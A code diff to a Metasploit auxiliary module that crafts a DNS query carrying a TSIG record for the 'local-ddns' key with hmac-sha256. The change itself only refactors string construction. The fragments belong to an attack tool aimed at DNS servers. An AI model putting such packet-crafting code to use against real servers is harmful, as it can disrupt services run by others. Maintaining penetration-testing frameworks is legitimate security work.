@@ -64,7 +64,7 @@ class MetasploitModule < Msf::Auxiliary
     query << "\x00\x01"  # Class: IN (0x0001)
 
     # Additional records. Name
-    query << "\x0a" + 'local-ddns'
+    query << "\x0alocal-ddns"
     query << "\x00"
 
     query << "\x00\xfa" # Type: TSIG (Transaction Signature) (250)
@@ -73,7 +73,7 @@ class MetasploitModule < Msf::Auxiliary
     query << "\x00\x1d" # Data length: 29
 
     # Algorithm Name
-    query << "\x0b" + 'hmac-sha256' # The algorithm for local-ddns is hmac-sha256
+    query << "\x0bhmac-sha256" # The algorithm for local-ddns is hmac-sha256
     query << "\x00"
 
     # Rest of TSIG
@@ -86,8 +86,8 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_domain
-    domain = "\x06" + Rex::Text.rand_text_alphanumeric(6)
-    org = "\x03" + Rex::Text.rand_text_alphanumeric(3)
+    domain = "\x06#{Rex::Text.rand_text_alphanumeric(6)}"
+    org = "\x03#{Rex::Text.rand_text_alphanumeric(3)}"
     domain + org
   end
 
